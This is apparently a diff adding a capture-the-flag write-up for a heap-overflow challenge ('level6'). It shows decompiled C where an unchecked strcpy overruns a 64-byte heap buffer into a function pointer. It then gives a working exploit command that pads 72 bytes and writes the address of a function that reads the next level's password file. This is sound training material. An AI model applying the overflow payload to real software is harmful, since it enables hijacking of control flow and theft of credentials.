@@ -1,0 +1,41 @@
+This level was very different from the previous ones.
+
+`
+//----- (08048454) --------------------------------------------------------
+int n()
+{
+  return system("/bin/cat /home/user/level7/.pass");
+}
+
+//----- (08048468) --------------------------------------------------------
+int m()
+{
+  return puts("Nope");
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int (**v4)(void); // [esp+18h] [ebp-8h]
+  char *v5; // [esp+1Ch] [ebp-4h]
+
+  v5 = (char *)malloc(0x40u);
+  v4 = (int (**)(void))malloc(4u);
+  *v4 = m;
+  strcpy(v5, argv[1]);
+  return (*v4)();
+}`
+
+The program allocates on the heap for the 2 variables v5 and v4, and v4 is then called as a function pointer.
+
+The breach is obviously in the strcpy, it writes the value of argv[1] in v5.
+-> v5's buffer is 0x40 bytes long, so we can overflow it and as v4 malloc() is done after, its address should be right after v5's buffer.
+
+As v4 is called as a function pointer, we can overwrite it with the address of the function n() (0x08048454).
+-> ./level6 `python -c "print 'a'*64 + '\x54\x84\x04\x08'"
+But the program segfaults because the address of the function n doesn't seem to be exactly there.
+
+So we tried more addresses
+`a*64, a*68, a*70, a*72`
+
+And the last one worked, we got the flag.
+-> /level6 `python -c "print 'a'*72 + '\x54\x84\x04\x08'"
